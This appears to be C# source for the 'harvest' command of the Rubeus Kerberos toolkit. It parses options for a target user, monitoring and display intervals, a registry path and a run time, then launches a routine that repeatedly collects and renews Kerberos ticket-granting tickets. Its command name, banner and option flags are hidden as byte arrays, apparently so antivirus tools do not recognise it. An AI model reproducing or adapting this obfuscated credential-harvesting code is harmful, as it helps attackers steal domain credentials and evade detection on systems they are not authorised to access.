using System;
using System.Collections.Generic;


namespace Rubeus.Commands
{
    public class HarvestCommand : ICommand
    {
        private static string S(byte[] b) => System.Text.Encoding.UTF8.GetString(b);
        public static string CommandName => S(new byte[] { 104, 97, 114, 118, 101, 115, 116 });

        public void Execute(Dictionary<string, string> arguments)
        {
            string S(byte[] b) => System.Text.Encoding.UTF8.GetString(b);

            Console.WriteLine(S(new byte[] { 91, 42, 93, 32, 65, 99, 116, 105, 111, 110, 58, 32, 84, 71, 84, 32, 72, 97, 114, 118, 101, 115, 116, 105, 110, 103, 32, 40, 119, 105, 116, 104, 32, 97, 117, 116, 111, 45, 114, 101, 110, 101, 119, 97, 108, 41 }));

            string targetUser = null;
            int monitorInterval = 60; // how often to check for new TGTs
            int displayInterval = 1200; // how often to display the working set of TGTs
            string registryBasePath = null;
            bool nowrap = false;
            int runFor = 0;

            if (arguments.ContainsKey(S(new byte[] { 47, 110, 111, 119, 114, 97, 112 })))
            {
                nowrap = true;
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 102, 105, 108, 116, 101, 114, 117, 115, 101, 114 })))
            {
                targetUser = arguments[S(new byte[] { 47, 102, 105, 108, 116, 101, 114, 117, 115, 101, 114 })];
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 116, 97, 114, 103, 101, 116, 117, 115, 101, 114 })))
            {
                targetUser = arguments[S(new byte[] { 47, 116, 97, 114, 103, 101, 116, 117, 115, 101, 114 })];
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 105, 110, 116, 101, 114, 118, 97, 108 })))
            {
                monitorInterval = Int32.Parse(arguments[S(new byte[] { 47, 105, 110, 116, 101, 114, 118, 97, 108 })]);
                displayInterval = Int32.Parse(arguments[S(new byte[] { 47, 105, 110, 116, 101, 114, 118, 97, 108 })]);
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 109, 111, 110, 105, 116, 111, 114, 105, 110, 116, 101, 114, 118, 97, 108 })))
            {
                monitorInterval = Int32.Parse(arguments[S(new byte[] { 47, 109, 111, 110, 105, 116, 111, 114, 105, 110, 116, 101, 114, 118, 97, 108 })]);
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 100, 105, 115, 112, 108, 97, 121, 105, 110, 116, 101, 114, 118, 97, 108 })))
            {
                displayInterval = Int32.Parse(arguments[S(new byte[] { 47, 100, 105, 115, 112, 108, 97, 121, 105, 110, 116, 101, 114, 118, 97, 108 })]);
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 114, 101, 103, 105, 115, 116, 114, 121 })))
            {
                registryBasePath = arguments[S(new byte[] { 47, 114, 101, 103, 105, 115, 116, 114, 121 })];
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 114, 117, 110, 102, 111, 114 })))
            {
                runFor = Int32.Parse(arguments[S(new byte[] { 47, 114, 117, 110, 102, 111, 114 })]);
            }

            if (!String.IsNullOrEmpty(targetUser))
            {
                Console.WriteLine("[*] Target user     : {0:x}", targetUser);
            }
            Console.WriteLine("[*] Monitoring every {0} seconds for new TGTs", monitorInterval);
            Console.WriteLine("[*] Displaying the working TGT cache every {0} seconds", displayInterval);
            if (runFor > 0)
            {
                Console.WriteLine("[*] Running collection for {0} seconds", runFor);
            }
            Console.WriteLine("");

            var harvester = new Harvest(monitorInterval, displayInterval, true, targetUser, registryBasePath, nowrap, runFor);
            harvester.HarvestTicketGrantingTickets();
        }
    }
}
